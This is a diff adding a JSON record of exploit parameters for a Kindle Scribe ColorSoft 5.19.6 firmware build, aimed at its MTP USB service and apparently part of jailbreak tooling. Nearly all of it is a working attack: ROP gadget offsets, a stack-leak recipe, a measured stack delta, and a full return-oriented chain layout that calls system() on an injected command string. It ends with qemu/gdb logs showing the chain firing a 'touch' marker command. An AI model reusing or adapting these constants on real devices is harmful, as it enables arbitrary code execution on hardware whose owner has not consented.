@@ -1,0 +1,408 @@
+{
+  "schema_version": 1,
+  "harvested_at": "2026-10-22T22:12:51Z",
+  "build_key": "4832260042",
+  "version_string": "System Software Version: 042-juno_1906_calvados_platcs8-483226",
+  "pretty_version": "Kindle 5.19.6 (~~otaVersion~~)",
+  "version": "5.19.6",
+  "models": [
+    "Kindle Scribe ColorSoft (2025)"
+  ],
+  "source": {
+    "file": "update_kindle_scribe_colorsoft_1st_generation_5.19.6.bin",
+    "kindletool_devices": [
+      "Device         Kindle Scribe ColorSoft (2025) (Unknown Variant 4VX)",
+      "Device         Kindle Scribe ColorSoft (2025) (Unknown Variant 4PF)",
+      "Device         Kindle Scribe ColorSoft (2025) (Unknown Variant 4PH)",
+      "Device         Kindle Scribe ColorSoft (2025) (Unknown Variant 4F9)",
+      "Device         Kindle Scribe ColorSoft (2025) (Unknown Variant 4FB)",
+      "Device         Kindle Scribe ColorSoft (2025) (Unknown Variant 46P)"
+    ],
+    "kindletool_target_ota": "4832260042",
+    "libglib_sha256": "5f2bc93d904369f18aefe3d09dd2681582a3dbcfe2e88049f2cf403580891832",
+    "rootfs_sha256": "219026cba24d33901423b2b562b4df4b3a76d3ac0a2ce66ccc8288206b87c748",
+    "rootfs_size": 1610612736,
+    "sha256": "adcf1e8beefbcb7942ea32c61a8f974b83de9955f23bda3b7a62f487e82fe555",
+    "size": 522771234
+  },
+  "tizen_mtp_sha256": "2dbbde9935a260f9f1a3b0e830a4565555c3e7b24a9662d8a6a5c07a1b99443b",
+  "offsets": {
+    "system": 129505,
+    "system_arm": 129504,
+    "pop_gadget": 19345,
+    "pop_gadget_mask": 122,
+    "ldr_blx_gadget": 109795,
+    "got_base": 176128,
+    "stack_delta": 3288,
+    "stack_delta_supported": true,
+    "stack_delta_verified": true
+  },
+  "leak": {
+    "slot4_raw_off": 2,
+    "slot16_raw_off": 14,
+    "anchor_low12": 2240,
+    "recipe_supported": true
+  },
+  "usb": {
+    "vid": "1949",
+    "pids": [
+      "9981"
+    ]
+  },
+  "tools": {
+    "chainverify": "verified (marker side effect observed)",
+    "fwharvest": "0.2.0",
+    "kindletool": "/usr/bin/kindletool (KindleTool) v1.6.5.347-gc90a5dc built by runner@runnervmh13bl on Ubuntu with GCC 13.3.0 on Jan  4 2026 @ 09:06:00 against libarchive 3.7.2 \u0026 nettle 3.9.1",
+    "stackdelta": "delta=0xcd8 anchor=0x448008c0 sp=0x447ffbe8 verified=true"
+  },
+  "fwderive": {
+    "tizen_mtp_sha256": "2dbbde9935a260f9f1a3b0e830a4565555c3e7b24a9662d8a6a5c07a1b99443b",
+    "anchors": {
+      "rx_copy": {
+        "addr": "0x1fcd0",
+        "hits": [
+          "0x1fcd0"
+        ],
+        "reference": {
+          "key": "4832540042",
+          "addr": "0x1fcf0",
+          "sha256": "a22fc9e321a470cc3be8373b1c5c5384b8ec76888b5a6dbc277465c121063989"
+        }
+      },
+      "inject_event": {
+        "addr": "0x189b4",
+        "hits": [
+          "0x189b4"
+        ],
+        "reference": {
+          "key": "4832540042",
+          "addr": "0x189d4",
+          "sha256": "a22fc9e321a470cc3be8373b1c5c5384b8ec76888b5a6dbc277465c121063989"
+        }
+      }
+    }
+  },
+  "stackdelta_measurement": {
+    "tizen_mtp_sha256": "2dbbde9935a260f9f1a3b0e830a4565555c3e7b24a9662d8a6a5c07a1b99443b",
+    "text": {
+      "addr": "0x2fc0",
+      "size": 119880
+    },
+    "anchors": {
+      "rx_copy": {
+        "addr": "0x1fcd0",
+        "fingerprint": "80b485b000af786039607b689a683b68"
+      },
+      "inject_event": {
+        "addr": "0x189b4",
+        "fingerprint": "90b58db002aff860b9607a603b602949"
+      }
+    },
+    "host": {
+      "qemu": "qemu-arm version 10.2.1 (Debian 1:10.2.1+ds-1ubuntu3.2)",
+      "gdb": "GNU gdb (Ubuntu 17.1-2ubuntu1) 17.1"
+    },
+    "anchor": 1149241536,
+    "anchor_hex": "0x448008c0",
+    "anchor_low12": 2240,
+    "receiver_sp": 1149238248,
+    "receiver_sp_hex": "0x447ffbe8",
+    "stack_delta": 3288,
+    "stack_delta_hex": "0xcd8",
+    "stack_delta_verified": true,
+    "checks": {
+      "leak_wellformed": true,
+      "anchor_in_readable_region": true,
+      "transport_frame_unique": true,
+      "delta_bounds": true
+    },
+    "matches_expected": null,
+    "expected_delta": null,
+    "leak_after": "handlesAll",
+    "leak_raw": "0000010000000c000000b02a9044c0088044",
+    "stack_region": {
+      "start": "0x44001000",
+      "end": "0x44801000",
+      "name": "[anon]"
+    },
+    "frame_candidates": {
+      "0x447ffbe8": {
+        "frames": 27,
+        "frame_sig": [
+          "0x8/0x14"
+        ],
+        "distinct_src": 2,
+        "delta": 3288,
+        "dst_off": 20,
+        "caller_lr": [
+          "0x40892f"
+        ]
+      },
+      "0x447ff740": {
+        "frames": 17,
+        "frame_sig": [
+          "0x0/0x8"
+        ],
+        "distinct_src": 1,
+        "delta": 4480,
+        "dst_off": 8,
+        "caller_lr": [
+          "0x40904f"
+        ]
+      }
+    }
+  },
+  "chain_verification": {
+    "verified": true,
+    "tizen_mtp_sha256": "2dbbde9935a260f9f1a3b0e830a4565555c3e7b24a9662d8a6a5c07a1b99443b",
+    "base": "0x400000",
+    "layout": {
+      "s": {
+        "sp": 1149238248,
+        "dst": 1149238268,
+        "dst_off": 20
+      },
+      "src_off": {
+        "r4": 72,
+        "r7": 76,
+        "lr": 80
+      },
+      "caller_lr": "0x40892f",
+      "prologue": {
+        "entry": 34380,
+        "regs": [
+          "r4",
+          "r7",
+          "lr"
+        ],
+        "imm": 92,
+        "insns": [
+          "push {r4, r7, lr}",
+          "sub sp, #0x5c",
+          "add r7, sp, #8",
+          "str r0, [r7, #4]",
+          "str r1, [r7]",
+          "ldr r4, [pc, #0x3b8]"
+        ]
+      }
+    },
+    "anchors": {
+      "rx_copy": {
+        "addr": "0x1fcd0",
+        "fingerprint": "80b485b000af786039607b689a683b68"
+      },
+      "inject_event": {
+        "addr": "0x189b4",
+        "fingerprint": "90b58db002aff860b9607a603b602949"
+      }
+    },
+    "chain": {
+      "slots": [
+        [
+          80,
+          4213649,
+          "saved lr -\u003e pop gadget"
+        ],
+        [
+          84,
+          0,
+          "r1"
+        ],
+        [
+          88,
+          4323809,
+          "r3"
+        ],
+        [
+          92,
+          0,
+          "r4"
+        ],
+        [
+          96,
+          0,
+          "r5"
+        ],
+        [
+          100,
+          0,
+          "r6"
+        ],
+        [
+          104,
+          4304099,
+          "pc -\u003e ldr/blx gadget"
+        ],
+        [
+          108,
+          1149238380,
+          "[r7+44] -\u003e string address"
+        ],
+        [
+          72,
+          0,
+          "saved r4"
+        ],
+        [
+          76,
+          1149238332,
+          "saved r7 -\u003e [r7+44]=string"
+        ]
+      ],
+      "arg_off": 108,
+      "str_off": 112,
+      "str_addr": 1149238380,
+      "saved_r7": 1149238332,
+      "popped": [
+        "r1",
+        "r3",
+        "r4",
+        "r5",
+        "r6"
+      ],
+      "pop": 4213649,
+      "ldr_blx": 4304099,
+      "system": 4323809,
+      "str_bytes": "746f756368202f6d6e742f626173652d75732f434841494e56455249465900"
+    },
+    "command": "touch /mnt/base-us/CHAINVERIFY",
+    "marker": "CHAINVERIFY",
+    "marker_present": true,
+    "n": 33,
+    "chain_progress": [],
+    "frame_after_fire": [
+      "Thread 2 received signal SIGABRT, Aborted.",
+      "0x40afcb24 in ?? ()",
+      "(gdb) Breakpoint 2 at 0x40892e",
+      "(gdb) \u003e\u003e\u003e\u003e\u003e(gdb) Breakpoint 3 at 0x404b91",
+      "(gdb) \u003e\u003e\u003e\u003e(gdb) Breakpoint 4 at 0x41ace3",
+      "(gdb) \u003e\u003e\u003e\u003e(gdb) Breakpoint 5 at 0x41f9e1",
+      "(gdb) \u003e\u003e\u003e\u003e(gdb) Continuing.",
+      "",
+      "Thread 2 received signal SIGABRT, Aborted.",
+      "Cannot remove breakpoints because program is no longer writable.",
+      "Further execution is probably impossible.",
+      "0x40afcb24 in ?? ()",
+      "(gdb) pc             0x40afcb24          0x40afcb24",
+      "sp             0x447ff9a8          0x447ff9a8",
+      "lr             0x40afcb18          1085262616",
+      "r4             0xa202f             663599",
+      "r7             0x10c               268",
+      "r0             0x0                 0",
+      "r1             0xa202f             663599",
+      "r2             0x6                 6",
+      "r3             0x44800340          1149240128",
+      "(gdb) #0  0x40afcb24 in ?? ()",
+      "#1  0x40afcb18 in ?? ()",
+      "Backtrace stopped: previous frame identical to this frame (corrupt stack?)",
+      "(gdb) =\u003e 0x40afcb24:\tcmn\tr0, #4096\t@ 0x1000",
+      "0x40afcb28:\trsbhi\tr0, r0, #0",
+      "0x40afcb2c:\tmovls\tr0, #0",
+      "0x40afcb30:\tb\t0x40afcad4",
+      "0x40afcb34:\tmov\tr0, r5",
+      "0x40afcb38:\tbl\t0x40af7178",
+      "0x40afcb3c:\tb\t0x40afcab8",
+      "0x40afcb40:\tmov\tr0, r5",
+      "0x40afcb44:\tbl\t0x40af7084",
+      "0x40afcb48:\tb\t0x40afca8c",
+      "0x40afcb4c:\t\t\t@ \u003cUNDEFINED\u003e instruction: 0x000d67b8",
+      "0x40afcb50:\tpush\t{r11}\t\t@ (str r11, [sp, #-4]!)",
+      "(gdb) 0x447ffbe8:\t0x447ffc44\t0x40b0ac28\t0x00000005\t0x00000000",
+      "0x447ffbf8:\t0x40a93a58\t0x40b3798c\t0x40bfbe5c\t0x00000000",
+      "0x447ffc08:\t0x00000004\t0x00000000\t0x447ffc40\t0x00000000",
+      "0x447ffc18:\t0x42406bd0\t0x42406b0c\t0x447ffdbc\t0x447ffc6c",
+      "0x447ffc28:\t0x448008c0\t0x00000016\t0x447ffc3c\t0x44000000",
+      "0x447ffc38:\t0x42406bd0\t0x42406b0c\t0x447ffc64\t0x40b0d854",
+      "0x447ffc48:\t0x447ffc3c\t0x00404b91\t0x00000000\t0x00000000",
+      "0x447ffc58:\t0x00000000\t0x00000000\t0x447ffdbc\t0x0041aced",
+      "0x447ffc68:\t0x447ffc6c\t0x63756f74\t0x6d2f2068\t0x622f746e",
+      "0x447ffc78:\t0x2d657361\t0x432f7375\t0x4e494148\t0x49524556",
+      "(gdb) 0x43f00a08:\t0x00000024\t0x10010001\t0x00000071\t0x00000000",
+      "0x43f00a18:\t0x00000000\t0x00000000\t0x00000000\t0x00000000",
+      "0x43f00a28:\t0x00000040\t0x00000000\t0x00000000\t0x00000000",
+      "0x43f00a38:\t0x00000000\t0x00000000\t0x00000000\t0x00000000",
+      "0x43f00a48:\t0x00000000\t0x00000000\t0x00000000\t0x447ffc3c",
+      "0x43f00a58:\t0x00404b91\t0x00000000\t0x0041f9e1\t0x00000000",
+      "0x43f00a68:\t0x00000000\t0x00000000\t0x0041ace3\t0x447ffc6c",
+      "0x43f00a78:\t0x63756f74\t0x6d2f2068\t0x622f746e\t0x2d657361",
+      "0x43f00a88:\t0x432f7375\t0x4e494148\t0x49524556\t0x00005946",
+      "0x43f00a98:\t0x00000000\t0x00000000\t0x00000000\t0x00000000",
+      "(gdb)"
+    ],
+    "rx_after_fire": "240000000100011071000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000003cfc7f44914b400000000000e1f94100000000000000000000000000e3ac41006cfc7f44746f756368202f6d6e742f626173652d75732f434841494e564552494659000000000000000000000000000000000000",
+    "crash": [
+      "Thread 2 received signal SIGABRT, Aborted.",
+      "0x40afcb24 in ?? ()",
+      "(gdb) Breakpoint 2 at 0x40892e",
+      "(gdb) \u003e\u003e\u003e\u003e\u003e(gdb) Breakpoint 3 at 0x404b91",
+      "(gdb) \u003e\u003e\u003e\u003e(gdb) Breakpoint 4 at 0x41ace3",
+      "(gdb) \u003e\u003e\u003e\u003e(gdb) Breakpoint 5 at 0x41f9e1",
+      "(gdb) \u003e\u003e\u003e\u003e(gdb) Continuing.",
+      "",
+      "Thread 2 received signal SIGABRT, Aborted.",
+      "Cannot remove breakpoints because program is no longer writable.",
+      "Further execution is probably impossible.",
+      "0x40afcb24 in ?? ()",
+      "(gdb) pc             0x40afcb24          0x40afcb24",
+      "sp             0x447ff9a8          0x447ff9a8",
+      "lr             0x40afcb18          1085262616",
+      "r4             0xa202f             663599",
+      "r7             0x10c               268",
+      "r0             0x0                 0",
+      "r1             0xa202f             663599",
+      "r2             0x6                 6",
+      "r3             0x44800340          1149240128",
+      "(gdb) #0  0x40afcb24 in ?? ()",
+      "#1  0x40afcb18 in ?? ()",
+      "Backtrace stopped: previous frame identical to this frame (corrupt stack?)",
+      "(gdb) =\u003e 0x40afcb24:\tcmn\tr0, #4096\t@ 0x1000",
+      "0x40afcb28:\trsbhi\tr0, r0, #0",
+      "0x40afcb2c:\tmovls\tr0, #0",
+      "0x40afcb30:\tb\t0x40afcad4",
+      "0x40afcb34:\tmov\tr0, r5",
+      "0x40afcb38:\tbl\t0x40af7178",
+      "0x40afcb3c:\tb\t0x40afcab8",
+      "0x40afcb40:\tmov\tr0, r5",
+      "0x40afcb44:\tbl\t0x40af7084",
+      "0x40afcb48:\tb\t0x40afca8c",
+      "0x40afcb4c:\t\t\t@ \u003cUNDEFINED\u003e instruction: 0x000d67b8",
+      "0x40afcb50:\tpush\t{r11}\t\t@ (str r11, [sp, #-4]!)",
+      "(gdb) 0x447ffbe8:\t0x447ffc44\t0x40b0ac28\t0x00000005\t0x00000000",
+      "0x447ffbf8:\t0x40a93a58\t0x40b3798c\t0x40bfbe5c\t0x00000000",
+      "0x447ffc08:\t0x00000004\t0x00000000\t0x447ffc40\t0x00000000",
+      "0x447ffc18:\t0x42406bd0\t0x42406b0c\t0x447ffdbc\t0x447ffc6c",
+      "0x447ffc28:\t0x448008c0\t0x00000016\t0x447ffc3c\t0x44000000",
+      "0x447ffc38:\t0x42406bd0\t0x42406b0c\t0x447ffc64\t0x40b0d854",
+      "0x447ffc48:\t0x447ffc3c\t0x00404b91\t0x00000000\t0x00000000",
+      "0x447ffc58:\t0x00000000\t0x00000000\t0x447ffdbc\t0x0041aced",
+      "0x447ffc68:\t0x447ffc6c\t0x63756f74\t0x6d2f2068\t0x622f746e",
+      "0x447ffc78:\t0x2d657361\t0x432f7375\t0x4e494148\t0x49524556",
+      "(gdb) 0x43f00a08:\t0x00000024\t0x10010001\t0x00000071\t0x00000000",
+      "0x43f00a18:\t0x00000000\t0x00000000\t0x00000000\t0x00000000",
+      "0x43f00a28:\t0x00000040\t0x00000000\t0x00000000\t0x00000000",
+      "0x43f00a38:\t0x00000000\t0x00000000\t0x00000000\t0x00000000",
+      "0x43f00a48:\t0x00000000\t0x00000000\t0x00000000\t0x447ffc3c",
+      "0x43f00a58:\t0x00404b91\t0x00000000\t0x0041f9e1\t0x00000000",
+      "0x43f00a68:\t0x00000000\t0x00000000\t0x0041ace3\t0x447ffc6c",
+      "0x43f00a78:\t0x63756f74\t0x6d2f2068\t0x622f746e\t0x2d657361",
+      "0x43f00a88:\t0x432f7375\t0x4e494148\t0x49524556\t0x00005946",
+      "0x43f00a98:\t0x00000000\t0x00000000\t0x00000000\t0x00000000",
+      "(gdb)"
+    ],
+    "host": {
+      "qemu": "qemu-arm version 10.2.1 (Debian 1:10.2.1+ds-1ubuntu3.2)",
+      "gdb": "GNU gdb (Ubuntu 17.1-2ubuntu1) 17.1"
+    }
+  },
+  "elfscan_evidence": {
+    "execv_got": 176380,
+    "execv_plt": 11372,
+    "execv_call_site": 129592,
+    "system_prologue": "80b588b000af",
+    "string_table_addr": 159824,
+    "pop_gadget_candidates": 2,
+    "ldr_blx_gadget_candidates": 1,
+    "execv_call_sites": 1
+  },
+  "notes": "offsets decimal; build key = \u003clast6 of version line\u003e+0+\u003cleading build number\u003e; stack_delta measured under qemu with the firmware's own libc; chain_verification fires the offline ROP built from derived constants and requires the observable side effect"
+}
